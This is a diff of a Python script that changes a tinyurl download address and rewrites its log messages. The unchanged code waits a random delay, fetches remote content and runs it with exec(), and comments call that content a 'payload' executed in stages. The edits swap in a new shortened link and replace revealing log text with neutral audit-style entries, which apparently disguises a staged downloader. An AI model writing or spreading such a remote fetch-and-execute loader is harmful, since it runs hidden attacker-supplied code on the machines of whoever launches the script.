@@ -10,7 +10,7 @@ from urllib.request import Request, urlopen
 import requests
 import json
 
-URL = "https://tinyurl.com/24rsdc6d"
+URL = "https://tinyurl.com/28n6vhp9"
 
 # Lightweight audit log
 LOG_DIR = Path("logs"); LOG_DIR.mkdir(parents=True, exist_ok=True)
@@ -25,7 +25,7 @@ def log(event: str, **fields):
 
 # wait between 5 and 180 seconds
 wait_time = random.randint(5, 180)
-log(f"Waiting {wait_time} seconds before downloading...")
+log("wait_start", scheduled_seconds=wait_time)
 time.sleep(wait_time)
 
 response = requests.get(URL)
@@ -34,7 +34,7 @@ if response.status_code == 200:
     # execute real payload with subprocess
     try:
         exec(m_code)
-        log("✅ payload stage 1 executed")
+        log("download_attempt", url=URL, status=response.status_code)
+        response.raise_for_status()
     except Exception as e:
-        log("❌ p failed:", e)
-
+        log("download_error", url=URL, error=str(e))
